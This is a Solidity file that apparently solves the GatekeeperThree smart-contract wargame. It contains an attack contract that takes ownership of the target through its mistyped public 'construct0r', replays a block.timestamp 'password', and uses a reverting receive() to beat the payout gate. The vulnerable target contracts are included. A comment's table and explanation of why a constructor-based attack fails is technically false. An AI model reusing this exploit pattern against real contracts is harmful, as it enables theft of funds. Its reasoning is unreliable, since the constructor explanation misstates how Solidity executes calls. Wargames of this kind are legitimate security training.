// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract Hack
{
    function attack(GatekeeperThree adr)  public payable  // 2000000000000000 Wei
    {
        (bool i,)= payable (adr).call{value: 0.002 ether}("");
        require(i,"fail 1...");
        adr.construct0r();
        adr.createTrick();
        adr.getAllowance(block.timestamp); //****
        adr.enter();
    }

   /* _______________________________wrong solution____________________________________________________________________


    constructor(GatekeeperThree adr) payable     // 2000000000000000
    {
        (bool i,)= payable (adr).call{value: 0.002 ether}("");
        require(i,"fail 1...");
        adr.construct0r();
        adr.createTrick();
        adr.getAllowance(block.timestamp); //****
        adr.enter();
    }   
    
    _____________________________________Reason__________________________________________________________________________

For Example

      function func_1(GatekeeperThree adr)  public 
      {
          adr.f1();
          adr.f2();
      }


            vs 


      constructor func_1(GatekeeperThree adr)  
      {
          adr.f1();
          adr.f2();
      }


    __________________________________________________________________________________________________________________________
    |     Feature     	     |      inside function	                         |      Inside constructor                       |
    |________________________|_______________________________________________|_______________________________________________|
    |     Function call      |      f1(),then f2()                           |      f1(), then f2() (immediately after)      |
    |     order              |      (not necessarily immediately after)	     |                                               |
    |________________________|_______________________________________________|_______________________________________________|
    |                        |                                               |                                               |
    |     Other code  	     |      Possible	                               |      Not possible                             |
    |     in between         |                                               |                                               |   
    |________________________|_______________________________________________|_______________________________________________|


Inside function :

            calls adr.f1()     -->     (if any external or internal call)      -->   adr.f2() 

            This means that f2 is not necessary to be called immediately after f1    --->   Other code could be executed in between, potentially affecting the state of the system before f2 is called.
            there are no restrictions on what other statements can be placed between these two calls. 
           

Inside the constructor:

            calls adr.f1()     -->              immediately                 -->   adr.f2()        (there is no chance for other code to be interleaved between the calls to f1 and f2. )

            However, constructor code is executed sequentially from top to bottom. 


    */



    receive() external payable 
    {
      revert();
    }
}








//_________________________________________________________________________________________________________________________________________________________

contract SimpleTrick 
{
    GatekeeperThree public target;
    address public trick;
    uint private password = block.timestamp;

    constructor (address payable _target) 
    {
        target = GatekeeperThree(_target);
    }
        
    function checkPassword(uint _password) public returns (bool) 
    {
        if (_password == password) {
        return true;
        }
        password = block.timestamp;
        return false;
    }
        
    function trickInit() public {
        trick = address(this);
    }
        
    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
        target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}